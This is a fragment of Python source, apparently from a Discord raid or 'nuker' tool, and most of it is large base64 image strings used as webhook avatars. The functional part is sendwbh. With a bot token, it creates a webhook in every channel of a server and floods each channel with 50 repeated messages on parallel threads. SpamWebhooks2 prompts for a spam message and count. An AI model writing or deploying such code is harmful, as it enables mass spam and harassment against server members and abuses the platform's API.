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'
        def sendwbh(chid, wbh, tkn, img):
            payload = {
                'name': wbh,
                'avatar': img
            }
            r = requests.post(f'https://discord.com/api/v9/channels/{chid}/webhooks', headers={'authorization': f'Bot {tkn}'}, json=payload)
            if r.status_code in [200, 201, 204]:
                Logging.success('Successfully created webhook')
                wbhinf = r.json()
                url = wbhinf['url']
                for _ in range(50):
                    payload2 = {
                        'content': msg
                    }

                    try:
                        kingdawn = requests.post(url, json=payload2)
                        if kingdawn.status_code in [200, 201, 204]:
                            Logging.success(f'Successfully sent message with webhook {url}')
                        elif kingdawn.status_code == 429:
                            Logging.info('Rate limit while sending webhook message')
                        else:
                            Logging.fail('Failed to send webhook message')
                    except Exception as e:
                        Logging.fail(f'Failed to do whatever {e}')
        
        for channel in channels:
            t = threading.Thread(target=sendwbh, args=(channel['id'],wbh,tkn,img,))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        return True

    def SpamWebhooks2(self):
        msg = Logging.inp('Spam', 'Message')
        amount = int(Logging.inp('Spam', 'Amount'))

        wbh = self.wbh
        tkn = self.tkn

        channels = self.getchannels(self.serverid)
        threads = []
        img = 'data:image/png;base64,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